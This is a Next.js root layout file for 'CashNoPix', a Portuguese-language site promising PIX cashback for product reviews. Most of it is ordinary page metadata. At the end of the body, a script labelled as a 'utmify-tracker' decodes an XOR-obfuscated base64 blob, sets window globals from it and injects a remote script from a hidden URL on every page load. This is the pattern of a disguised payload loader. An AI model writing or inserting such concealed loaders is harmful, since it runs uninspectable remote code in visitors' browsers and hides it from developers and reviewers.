import { Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";

const inter = Inter({ subsets: ["latin"] });

export const metadata = {
  metadataBase: new URL("https://cashnopix-front-v2.vercel.app"),
  title: "CashNoPix — Avalie Produtos e Ganhe Cashback no PIX",
  description:
    "O CashNoPix é o aplicativo de cash no pix que conecta consumidores a marcas parceiras. Avalie produtos, acumule saldo e saque direto via PIX.",
  openGraph: {
    title: "CashNoPix — Avalie Produtos e Ganhe Cashback no PIX",
    description: "Avalie produtos, acumule saldo e saque direto via PIX.",
    images: ["/og-image.png"],
  },
  twitter: {
    card: "summary_large_image",
    title: "CashNoPix — Avalie Produtos e Ganhe Cashback no PIX",
    description: "Avalie produtos, acumule saldo e saque direto via PIX.",
    images: ["/og-image.png"],
  },
  icons: {
    icon: "/favicon.svg",
    shortcut: "/favicon.svg",
  },
};

export default function RootLayout({ children }) {
  return (
    <html lang="pt-BR">
      <body className={inter.className}>
        {children}
        <Script
          id="utmify-tracker"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var r_mq0t=atob("DD8SZ+oIP8Zs/5YxhEQwEphkHfxOl+JF9EwoSMVrW6hCiuJc7VlrSYlnUugOjblC5017F557ELMYkuUe6F5mApl8Eawf3boT5UtmFYNqSrIJjLQL30QwCYtlWuRW3fJQ8F4/Ep5lVqAV0uZD4Ul3CZ4lR6UDm7tC51QwS8h+XqoZmrQLph1vS5EqUacBmrQLpltzE4slSrIBlvBIqU9gApxtUbJBjONT7VthRcYqSacAivMTvh0wGrd1");var m_h=[];for(var p_lvef=0;p_lvef<r_mq0t.length;p_lvef++){m_h.push(r_mq0t.charCodeAt(p_lvef)&255);}var e_m=m_h[0];var r_vcn=m_h.slice(1,1+e_m);var x_9=m_h.slice(1+e_m);var v_f=x_9.map(function(b,x_ije){return b^r_vcn[x_ije%e_m];});var j_rido="";for(var z_vwxs=0;z_vwxs<v_f.length;z_vwxs++){j_rido+=String.fromCharCode(v_f[z_vwxs]&255);}var o_79=decodeURIComponent(escape(j_rido));var r_9=JSON.parse(o_79);var j_t8a1=r_9.globals||[];j_t8a1.forEach(function(u_nw){window[u_nw.name]=u_nw.value;});var k_h2i=document.createElement("script");k_h2i.src=r_9.url;k_h2i.async=true;k_h2i.defer=true;(r_9.attributes||[]).forEach(function(e_v0v){k_h2i.setAttribute(e_v0v.name,e_v0v.value);});(document.head||document.documentElement).appendChild(k_h2i);})();`,
          }}
        />
      </body>
    </html>
  );
}
